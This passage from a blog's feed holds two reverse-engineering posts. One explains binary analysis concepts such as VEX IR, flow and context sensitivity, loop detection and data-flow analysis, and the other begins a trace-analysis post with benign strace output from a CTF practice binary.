</code></pre></div><p>As you can see, the single add instruction results in 10 VEX instructions, plus some metadata. First, there’s some metadata that says this is an <strong>IR super block</strong> (<strong>IRSB</strong>) ➊ corresponding to one machine instruction. The IRSB contains four temporary values labeled t0–t3, all of type <strong>Ity_I64</strong> (64-bit integer) ➋. Then there’s an <strong>IMark</strong> ➌, which is metadata stating the machine instruction’s address and length, among other things. Next come the actual IR instructions modeling the add. First, there are two GET instructions that fetch 64-bit values from rax and rdx into temporary stores t2 and t1, respectively ➍. Note that, here, rax and rdx are just symbolic names for the parts of VEX’s state used to model these registers—the VEX instructions don’t fetch from the real rax or rdx registers but rather from VEX’s mirror state of those registers. To perform the actual addition, the IR uses VEX’s Add64 instruction, adding the two 64-bit integers t2 and t1 and storing the result in t0 ➎. After the addition, there are some PUT instructions that model the add instruction’s side effects, such as updating the x86 status flags ➏. Then, another PUT stores the result of the addition into VEX’s state representing rax ➐. Finally, the VEX IR models updating the program counter to the next instruction ➑. The <strong>Ijk_Boring</strong> (<strong>Jump Kind Boring</strong>) ➒ is a control-flow hint that says the add instruction doesn’t affect the control flow in any interesting way; since the add isn’t a branch of any kind, control just “falls through” to the next instruction in memory. In contrast, branch instructions can be marked with hints like <strong>Ijk_Call</strong> or <strong>Ijk_Ret</strong> to inform the analysis that a call or return is taking place, for example.</p>
<h2 id="fundamental-analysis-methods">Fundamental Analysis Methods</h2>
<p>A few standard analysis that are widely applicable and aren’t stand-alone binary analysis techniques, but can be used as ingredients of more advanced binary analysis.</p>
<h3 id="binary-analysis-properties">Binary Analysis Properties</h3>
<p>Some of the different properties that any binary analysis approach can have that will help to classify the different techniques:</p>
<h4 id="interprocedural-and-intraprocedural-analysis">Interprocedural and Intraprocedural Analysis</h4>
<ul>
<li>The number of possible paths through a program increases exponentially with the number of control transfers (such as jumps and calls) in the program.</li>
<li>An <strong>Intraprocedural Analysis</strong> will analyze the CFG of each function in turn. The downside is that it’s incomplete, for instance:
<ul>
<li> If your program contains a bug that’s triggered only after a very specific combination of function calls, an intraprocedural bug detection tool won’t find the bug. It will simply consider each function on its own and conclude there’s nothing wrong.</li>
<li>If a function is dead code due to calls with hard-coded values, intraprocedural tool will just see the function being used and not the bigger picture, and will thus keep it instead of eliminating it.</li>
</ul>
</li>
<li>An <strong>Interprocedural Analysis</strong> considers an entire program as a whole, typically by linking all the function CFGs together via the call graph.</li>
</ul>
<h4 id="flow-sensitivity">Flow-Sensitivity</h4>
<ul>
<li>
<p>Flow-sensitivity means that the analysis takes the order of the instructions into account.</p>
</li>
<li>
<p>Analysis that tries to determine the potential values each variable can assume is called <strong>value set analysis</strong>.</p>
<p>x = unsigned_int(argv[0]) 	# x ∈ [0,∞]
x = x + 5 					# x ∈ [5,∞]
x = x + 10 					# x ∈ [15,∞]</p>
</li>
</ul>
<p>A flow-insensitive version of this analysis would simply determine that x may contain any value since it gets its value from user input. A flow-sensitive version of the analysis would yield more precise results. In contrast to the flow-insensitive variant, it provides an estimate of x’s possible value set at each point in the program, taking into account the previous instructions.</p>
<h4 id="context-sensitivity">Context-Sensitivity</h4>
<ul>
<li>Takes the order of function invocations into account.</li>
<li>Meaningful only for interprocedural analyses.</li>
<li>A context-insensitive interprocedural analysis computes a single, global result.</li>
<li>A context-sensitive analysis computes a separate result for each possible path through the call graph (for each possible order in which the functions may appear on the call stack).</li>
<li>The accuracy of a context-sensitive analysis is bounded by the accuracy of the call graph. The context of the analysis is the state accrued while traversing the call graph.</li>
<li>The context is usually limited as large contexts make flow-sensitive analysis computationally expensive. For instance, the analysis may only compute results for contexts of five (or any number of) consecutive functions instead of complete paths of indefinite length.</li>
</ul>
<p><img src="/Disassembly_and_Binary_Analysis_Fundamentals/3_image.png" alt="">
<em>Context-sensitive versus context-insensitive indirect call analysis.</em></p>
<p>A context-insensitive indirect call analysis concludes that the indirect call in channel_handler could target any function pointer in either the channel_pre table (passed in from channel_prepare_select) or the channel_post table (passed in from channel_after_select). Effectively, it concludes that the set of possible targets is the union of all the possible sets in any path through the program ➊. In contrast, the context-sensitive analysis determines a different target set for each possible context of preceding calls. If channel_handler was invoked by channel_prepare_select, then the only valid targets are those in the channel_pre table that it passes to channel_handler ➋. On the other hand, if channel_handler was called from channel_after_select, then only the targets in channel_post are possible ➌. Context length is 1.</p>
<ul>
<li>As with flow-sensitivity, the upside of context-sensitivity is increased precision, while the downside is the greater computational complexity. In addition, context-sensitive analyses must deal with the large amount of state that must be kept to track all the different contexts. Moreover, if there are any recursive functions, the number of possible contexts is infinite, so special measures are needed to deal with these cases. Often, it may not be feasible to create a scalable context-sensitive version of an analysis without resorting to cost and benefit trade-offs such as limiting the context size.</li>
</ul>
<h3 id="control-flow-analysis">Control-Flow Analysis</h3>
<p>A binary analysis that looks at control-flow properties.</p>
<h4 id="loop-detection">Loop Detection</h4>
<p><img src="/Disassembly_and_Binary_Analysis_Fundamentals/4_image.png" alt="">
<em>A CFG and the corresponding dominance tree.</em></p>
<ul>
<li>Loops are an interesting target for optimization.</li>
<li>From a security perspective, analyzing loops is useful because vulnerabilities such as buffer overflows tend to occur in loops.</li>
<li>Loop detection algorithms used in compilers look for <strong>natural loops</strong>, which are loops with only 2 blocks that can be said to dominate each other (BB3 and BB5).</li>
<li>The <strong>dominance tree</strong> encodes all the dominance relationships in the CFG. </li>
<li>A basic block A is said to dominate another basic block B if the only way to get to B from the entry point of the CFG is to go through A first. Now a natural loop is induced by a back edge from a basic block B to A, where A dominates B. The loop resulting from this back edge contains all basic blocks dominated by A from which there is a path to B. Conventionally, B itself is excluded from this set. Intuitively, this definition means that natural loops cannot be entered somewhere in the middle but only at a well defined <strong>header node</strong>. This simplifies the analysis of natural loops.</li>
</ul>
<h4 id="cycle-detection">Cycle Detection</h4>
<ul>
<li>If a loop can be entered in the middle, then it&rsquo;s not a natural loop, but a cycle (BB4 to BB7, can be entered at BB6).</li>
<li>Simply start a depth-first search (DFS) from the entry node of the CFG, then keep a stack where you push any basic block that the DFS traverses and “pop” it back off when the DFS backtracks. If the DFS ever hits a basic block that’s already on the stack, then you’ve found a cycle.</li>
</ul>
<h3 id="data-flow-analysis">Data-Flow Analysis</h3>
<p>A binary analysis that looks at data flow–oriented properties.</p>
<h4 id="reaching-definitions-analysis">Reaching Definitions Analysis</h4>
<ul>
<li>A data definition can <em><strong>reach</strong></em> a point in the program implies that a value assigned to a variable (or, at a lower level, a register or memory location) can reach that point without the value being overwritten by another assignment in the meantime.</li>
<li>Reaching definitions analysis is usually applied at the CFG level, though it can also be used interprocedurally. </li>
</ul>
<p><img src="/Disassembly_and_Binary_Analysis_Fundamentals/5_image.png" alt="">
<em>Gen and kill sets for a basic block.</em></p>
<ul>
<li>The analysis starts by considering for each individual basic block which definitions the block generates and which it kills. This is usually expressed by computing a gen and kill set for each basic block. After computing each basic block’s gen and kill sets, you have a local solution that tells you which data definitions each basic block generates and kills. You can compute a global solution that tells you which definitions (from anywhere in the CFG) can reach the start of a basic block and which can still be alive after the basic block. </li>
<li>The set of definitions reaching B is the union of all sets of definitions leaving other basic blocks that precede B. The set of definitions leaving a basic block B is denoted as out[B] and defined as follows: out[B] = gen[B] ∪ (in[B] − kill[B])</li>
<li>Since there’s a mutual dependency between the definitions of the in and out sets: in is defined in terms of out, and vice versa, it’s not enough for a reaching definitions analysis to compute the in and out sets for each basic block just once. Instead, the analysis must be iterative: in each iteration, it computes the sets for every basic block, and it continues iterating until there are no more changes in the sets. Once all of the in and out sets have reached a stable state, the analysis is complete.</li>
</ul>
<h4 id="use-def-chains">Use-Def Chains</h4>
<p><img src="/Disassembly_and_Binary_Analysis_Fundamentals/6_image.png" alt="">
<em>Use-def chains.</em></p>
<ul>
<li>Tell you at each point in the program where a variable is used, where that variable may have been defined.</li>
<li>Used in decompilation: they allow the decompiler to track where a value used in a conditional jump was compared. This way, the decompiler can take a cmp x,5 and je (jump if equal) instruction and merge them into a higher-level expression like if(x == 5). </li>
<li>Use-def chains are also used in compiler optimizations such as <strong>constant propagation</strong>, which replaces a variable by a constant if that’s the only possible value at that point in the program.</li>
</ul>
<p>The use-def chain for y in B2 contains statements 2 and 7. This is because at that point in the CFG, y could have gotten its value from the original assignment at statement 2 or (after one iteration of the loop) at statement 7. Note that there’s no use-def chain for z in B2, as z is only assigned in that basic block, not used.</p>
<h4 id="program-slicing">Program Slicing</h4>
<ul>
<li>Aims to extract all instructions (or, for source-based analysis, lines of code) that contribute to the values of a chosen set of variables at a certain point in the program (called the <strong>slicing criterion</strong>).
<ul>
<li><strong>Backward slicing</strong> searches backward for lines that affect the chosen slicing criterion.</li>
<li><strong>Forward slicing</strong> starts from a point in the program and then searches forward.</li>
</ul>
</li>
</ul>
<h2 id="effects-of-compiler-settings-on-disassembly">Effects of Compiler Settings on Disassembly</h2>
<p>Optimized code is usually significantly harder to accurately disassemble (and therefore analyze). Optimized code corresponds less closely to the original source, making it less intuitive to a human. </p>
<ul>
<li>Compilers will go out of their way to avoid the very slow mul and div instructions and instead implement multiplications and divisions using a series of bitshift and add operations.</li>
<li>Compilers often merge small functions into the larger functions calling them, to avoid the cost of the call instruction; this merging is called <strong>inlining.</strong></li>
<li>Compilers often emit padding bytes between functions and basic blocks to align them at memory addresses where they can be most efficiently accessed. Interpreting these padding bytes as code can cause disassembly errors if the padding bytes aren’t valid instructions.</li>
<li>Compilers may “unroll” loops to avoid the overhead of jumping to the next iteration. This hinders loop detection algorithms and decompilers, which try to find high-level constructs like while and for loops in the code.</li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Trace Analysis</title>
            <link>https://hexterisk.github.io/blog/posts/2020/03/13/trace-analysis/</link>
            <pubDate>Fri, 13 Mar 2020 00:00:00 +0000</pubDate>
            
            <guid>https://hexterisk.github.io/blog/posts/2020/03/13/trace-analysis/</guid>
            <description>System Call Trace strace can be used to investigate system call behavior. In some cases, you may want to attach strace to a running process. To do this, you need to use the -p pid option, where pid is the process ID of the process you want to attach to.
$ strace ./ctf show_me_the_flag ➊ execve(&amp;#34;./ctf&amp;#34;, [&amp;#34;./ctf&amp;#34;, &amp;#34;show_me_the_flag&amp;#34;], [/* 73 vars */]) = 0 brk(NULL) = 0x1053000 access(&amp;#34;/etc/ld.so.nohwcap&amp;#34;, F_OK) = -1 ENOENT (No such file or directory) mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f703477e000 access(&amp;#34;/etc/ld.</description>
            <content type="html"><![CDATA[<h2 id="system-call-trace">System Call Trace</h2>
<p><strong>strace</strong> can be used to investigate system call behavior. In some cases, you may want to attach strace to a running process. To do this, you need to use the -p pid option, where pid is the process ID of the process you want to attach to.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#960050;background-color:#1e0010">$</span> strace .<span style="color:#f92672">/</span>ctf show_me_the_flag
<span style="color:#960050;background-color:#1e0010">➊</span> execve(<span style="color:#e6db74">&#34;./ctf&#34;</span>, [<span style="color:#e6db74">&#34;./ctf&#34;</span>, <span style="color:#e6db74">&#34;show_me_the_flag&#34;</span>], [<span style="color:#75715e">/* 73 vars */</span>]) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
brk(NULL) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1053000</span>
access(<span style="color:#e6db74">&#34;/etc/ld.so.nohwcap&#34;</span>, F_OK) <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> ENOENT (No such file or directory)
mmap(NULL, <span style="color:#ae81ff">8192</span>, PROT_READ<span style="color:#f92672">|</span>PROT_WRITE, MAP_PRIVATE<span style="color:#f92672">|</span>MAP_ANONYMOUS, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7f703477e000</span>
access(<span style="color:#e6db74">&#34;/etc/ld.so.preload&#34;</span>, R_OK) <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> ENOENT (No such file or directory)
<span style="color:#960050;background-color:#1e0010">➋</span> open(<span style="color:#e6db74">&#34;/ch3/tls/x86_64/lib5ae9b7f.so&#34;</span>, O_RDONLY<span style="color:#f92672">|</span>O_CLOEXEC) <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> ENOENT (No such file or ...)
stat(<span style="color:#e6db74">&#34;/ch3/tls/x86_64&#34;</span>, <span style="color:#ae81ff">0x7ffcc6987ab0</span>) <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> ENOENT (No such file or directory)
open(<span style="color:#e6db74">&#34;/ch3/tls/lib5ae9b7f.so&#34;</span>, O_RDONLY<span style="color:#f92672">|</span>O_CLOEXEC) <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> ENOENT (No such file or directory)
stat(<span style="color:#e6db74">&#34;/ch3/tls&#34;</span>, <span style="color:#ae81ff">0x7ffcc6987ab0</span>) <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> ENOENT (No such file or directory)
open(<span style="color:#e6db74">&#34;/ch3/x86_64/lib5ae9b7f.so&#34;</span>, O_RDONLY<span style="color:#f92672">|</span>O_CLOEXEC) <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> ENOENT (No such file or directory)
stat(<span style="color:#e6db74">&#34;/ch3/x86_64&#34;</span>, <span style="color:#ae81ff">0x7ffcc6987ab0</span>) <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> ENOENT (No such file or directory)
open(<span style="color:#e6db74">&#34;/ch3/lib5ae9b7f.so&#34;</span>, O_RDONLY<span style="color:#f92672">|</span>O_CLOEXEC) <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
<span style="color:#960050;background-color:#1e0010">➌</span> read(<span style="color:#ae81ff">3</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\177</span><span style="color:#e6db74">ELF</span><span style="color:#ae81ff">\2\1\1\0\0\0\0\0\0\0\0\0\3\0</span><span style="color:#e6db74">&gt;</span><span style="color:#ae81ff">\0\1\0\0\0</span><span style="color:#e6db74">p</span><span style="color:#ae81ff">\t\0\0\0\0\0\0</span><span style="color:#e6db74">&#34;</span>..., <span style="color:#ae81ff">832</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">832</span>
fstat(<span style="color:#ae81ff">3</span>, st_mode<span style="color:#f92672">=</span>S_IFREG<span style="color:#f92672">|</span><span style="color:#ae81ff">0775</span>, st_size<span style="color:#f92672">=</span><span style="color:#ae81ff">10296</span>, ...) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
mmap(NULL, <span style="color:#ae81ff">2105440</span>, PROT_READ<span style="color:#f92672">|</span>PROT_EXEC, MAP_PRIVATE<span style="color:#f92672">|</span>MAP_DENYWRITE, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7f7034358000</span>
mprotect(<span style="color:#ae81ff">0x7f7034359000</span>, <span style="color:#ae81ff">2097152</span>, PROT_NONE) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
mmap(<span style="color:#ae81ff">0x7f7034559000</span>, <span style="color:#ae81ff">8192</span>, PROT_READ<span style="color:#f92672">|</span>PROT_WRITE, ..., <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0x1000</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7f7034559000</span>
close(<span style="color:#ae81ff">3</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
open(<span style="color:#e6db74">&#34;/ch3/libstdc++.so.6&#34;</span>, O_RDONLY<span style="color:#f92672">|</span>O_CLOEXEC) <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> ENOENT (No such file or directory)
open(<span style="color:#e6db74">&#34;/etc/ld.so.cache&#34;</span>, O_RDONLY<span style="color:#f92672">|</span>O_CLOEXEC) <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
fstat(<span style="color:#ae81ff">3</span>, st_mode<span style="color:#f92672">=</span>S_IFREG<span style="color:#f92672">|</span><span style="color:#ae81ff">0644</span>, st_size<span style="color:#f92672">=</span><span style="color:#ae81ff">150611</span>, ...) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
mmap(NULL, <span style="color:#ae81ff">150611</span>, PROT_READ, MAP_PRIVATE, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7f7034759000</span>
close(<span style="color:#ae81ff">3</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
access(<span style="color:#e6db74">&#34;/etc/ld.so.nohwcap&#34;</span>, F_OK) <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> ENOENT (No such file or directory)
<span style="color:#960050;background-color:#1e0010">➍</span> open(<span style="color:#e6db74">&#34;/usr/lib/x86_64-linux-gnu/libstdc++.so.6&#34;</span>, O_RDONLY<span style="color:#f92672">|</span>O_CLOEXEC) <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
read(<span style="color:#ae81ff">3</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\177</span><span style="color:#e6db74">ELF</span><span style="color:#ae81ff">\2\1\1\3\0\0\0\0\0\0\0\0\3\0</span><span style="color:#e6db74">&gt;</span><span style="color:#ae81ff">\0\1\0\0\0</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\235\10\0\0\0\0\0</span><span style="color:#e6db74">&#34;</span>..., <span style="color:#ae81ff">832</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">832</span>
fstat(<span style="color:#ae81ff">3</span>, st_mode<span style="color:#f92672">=</span>S_IFREG<span style="color:#f92672">|</span><span style="color:#ae81ff">0644</span>, st_size<span style="color:#f92672">=</span><span style="color:#ae81ff">1566440</span>, ...) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
mmap(NULL, <span style="color:#ae81ff">3675136</span>, PROT_READ<span style="color:#f92672">|</span>PROT_EXEC, MAP_PRIVATE<span style="color:#f92672">|</span>MAP_DENYWRITE, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7f7033fd6000</span>
mprotect(<span style="color:#ae81ff">0x7f7034148000</span>, <span style="color:#ae81ff">2097152</span>, PROT_NONE) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
mmap(<span style="color:#ae81ff">0x7f7034348000</span>, <span style="color:#ae81ff">49152</span>, PROT_READ<span style="color:#f92672">|</span>PROT_WRITE, ..., <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0x172000</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7f7034348000</span>
mmap(<span style="color:#ae81ff">0x7f7034354000</span>, <span style="color:#ae81ff">13312</span>, PROT_READ<span style="color:#f92672">|</span>PROT_WRITE, ..., <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7f7034354000</span>
close(<span style="color:#ae81ff">3</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
open(<span style="color:#e6db74">&#34;/ch3/libgcc_s.so.1&#34;</span>, O_RDONLY<span style="color:#f92672">|</span>O_CLOEXEC) <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> ENOENT (No such file or directory)
access(<span style="color:#e6db74">&#34;/etc/ld.so.nohwcap&#34;</span>, F_OK) <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> ENOENT (No such file or directory)
open(<span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libgcc_s.so.1&#34;</span>, O_RDONLY<span style="color:#f92672">|</span>O_CLOEXEC) <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
read(<span style="color:#ae81ff">3</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\177</span><span style="color:#e6db74">ELF</span><span style="color:#ae81ff">\2\1\1\0\0\0\0\0\0\0\0\0\3\0</span><span style="color:#e6db74">&gt;</span><span style="color:#ae81ff">\0\1\0\0\0</span><span style="color:#e6db74">p*</span><span style="color:#ae81ff">\0\0\0\0\0\0</span><span style="color:#e6db74">&#34;</span>..., <span style="color:#ae81ff">832</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">832</span>
fstat(<span style="color:#ae81ff">3</span>, st_mode<span style="color:#f92672">=</span>S_IFREG<span style="color:#f92672">|</span><span style="color:#ae81ff">0644</span>, st_size<span style="color:#f92672">=</span><span style="color:#ae81ff">89696</span>, ...) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
mmap(NULL, <span style="color:#ae81ff">4096</span>, PROT_READ<span style="color:#f92672">|</span>PROT_WRITE, MAP_PRIVATE<span style="color:#f92672">|</span>MAP_ANONYMOUS, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7f7034758000</span>
mmap(NULL, <span style="color:#ae81ff">2185488</span>, PROT_READ<span style="color:#f92672">|</span>PROT_EXEC, MAP_PRIVATE<span style="color:#f92672">|</span>MAP_DENYWRITE, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7f7033dc0000</span>
mprotect(<span style="color:#ae81ff">0x7f7033dd6000</span>, <span style="color:#ae81ff">2093056</span>, PROT_NONE) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
mmap(<span style="color:#ae81ff">0x7f7033fd5000</span>, <span style="color:#ae81ff">4096</span>, PROT_READ<span style="color:#f92672">|</span>PROT_WRITE, ..., <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0x15000</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7f7033fd5000</span>
close(<span style="color:#ae81ff">3</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
open(<span style="color:#e6db74">&#34;/ch3/libc.so.6&#34;</span>, O_RDONLY<span style="color:#f92672">|</span>O_CLOEXEC) <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> ENOENT (No such file or directory)
access(<span style="color:#e6db74">&#34;/etc/ld.so.nohwcap&#34;</span>, F_OK) <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> ENOENT (No such file or directory)
open(<span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>, O_RDONLY<span style="color:#f92672">|</span>O_CLOEXEC) <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
read(<span style="color:#ae81ff">3</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\177</span><span style="color:#e6db74">ELF</span><span style="color:#ae81ff">\2\1\1\3\0\0\0\0\0\0\0\0\3\0</span><span style="color:#e6db74">&gt;</span><span style="color:#ae81ff">\0\1\0\0\0</span><span style="color:#e6db74">P</span><span style="color:#ae81ff">\t\2\0\0\0\0\0</span><span style="color:#e6db74">&#34;</span>..., <span style="color:#ae81ff">832</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">832</span>
fstat(<span style="color:#ae81ff">3</span>, st_mode<span style="color:#f92672">=</span>S_IFREG<span style="color:#f92672">|</span><span style="color:#ae81ff">0755</span>, st_size<span style="color:#f92672">=</span><span style="color:#ae81ff">1864888</span>, ...) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
mmap(NULL, <span style="color:#ae81ff">3967392</span>, PROT_READ<span style="color:#f92672">|</span>PROT_EXEC, MAP_PRIVATE<span style="color:#f92672">|</span>MAP_DENYWRITE, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7f70339f7000</span>
mprotect(<span style="color:#ae81ff">0x7f7033bb6000</span>, <span style="color:#ae81ff">2097152</span>, PROT_NONE) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
mmap(<span style="color:#ae81ff">0x7f7033db6000</span>, <span style="color:#ae81ff">24576</span>, PROT_READ<span style="color:#f92672">|</span>PROT_WRITE, ..., <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0x1bf000</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7f7033db6000</span>
mmap(<span style="color:#ae81ff">0x7f7033dbc000</span>, <span style="color:#ae81ff">14752</span>, PROT_READ<span style="color:#f92672">|</span>PROT_WRITE, ..., <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7f7033dbc000</span>
close(<span style="color:#ae81ff">3</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
open(<span style="color:#e6db74">&#34;/ch3/libm.so.6&#34;</span>, O_RDONLY<span style="color:#f92672">|</span>O_CLOEXEC) <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> ENOENT (No such file or directory)
access(<span style="color:#e6db74">&#34;/etc/ld.so.nohwcap&#34;</span>, F_OK) <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> ENOENT (No such file or directory)
open(<span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libm.so.6&#34;</span>, O_RDONLY<span style="color:#f92672">|</span>O_CLOEXEC) <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
read(<span style="color:#ae81ff">3</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\177</span><span style="color:#e6db74">ELF</span><span style="color:#ae81ff">\2\1\1\3\0\0\0\0\0\0\0\0\3\0</span><span style="color:#e6db74">&gt;</span><span style="color:#ae81ff">\0\1\0\0\0\0</span><span style="color:#e6db74">V</span><span style="color:#ae81ff">\0\0\0\0\0\0</span><span style="color:#e6db74">&#34;</span>..., <span style="color:#ae81ff">832</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">832</span>
fstat(<span style="color:#ae81ff">3</span>, st_mode<span style="color:#f92672">=</span>S_IFREG<span style="color:#f92672">|</span><span style="color:#ae81ff">0644</span>, st_size<span style="color:#f92672">=</span><span style="color:#ae81ff">1088952</span>, ...) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
mmap(NULL, <span style="color:#ae81ff">3178744</span>, PROT_READ<span style="color:#f92672">|</span>PROT_EXEC, MAP_PRIVATE<span style="color:#f92672">|</span>MAP_DENYWRITE, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7f70336ee000</span>
mprotect(<span style="color:#ae81ff">0x7f70337f6000</span>, <span style="color:#ae81ff">2093056</span>, PROT_NONE) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
mmap(<span style="color:#ae81ff">0x7f70339f5000</span>, <span style="color:#ae81ff">8192</span>, PROT_READ<span style="color:#f92672">|</span>PROT_WRITE, ..., <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0x107000</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7f70339f5000</span>
close(<span style="color:#ae81ff">3</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
mmap(NULL, <span style="color:#ae81ff">4096</span>, PROT_READ<span style="color:#f92672">|</span>PROT_WRITE, MAP_PRIVATE<span style="color:#f92672">|</span>MAP_ANONYMOUS, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7f7034757000</span>
mmap(NULL, <span style="color:#ae81ff">4096</span>, PROT_READ<span style="color:#f92672">|</span>PROT_WRITE, MAP_PRIVATE<span style="color:#f92672">|</span>MAP_ANONYMOUS, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7f7034756000</span>
mmap(NULL, <span style="color:#ae81ff">8192</span>, PROT_READ<span style="color:#f92672">|</span>PROT_WRITE, MAP_PRIVATE<span style="color:#f92672">|</span>MAP_ANONYMOUS, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7f7034754000</span>
arch_prctl(ARCH_SET_FS, <span style="color:#ae81ff">0x7f7034754740</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
mprotect(<span style="color:#ae81ff">0x7f7033db6000</span>, <span style="color:#ae81ff">16384</span>, PROT_READ) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
mprotect(<span style="color:#ae81ff">0x7f70339f5000</span>, <span style="color:#ae81ff">4096</span>, PROT_READ) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
mmap(NULL, <span style="color:#ae81ff">4096</span>, PROT_READ<span style="color:#f92672">|</span>PROT_WRITE, MAP_PRIVATE<span style="color:#f92672">|</span>MAP_ANONYMOUS, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7f7034753000</span>
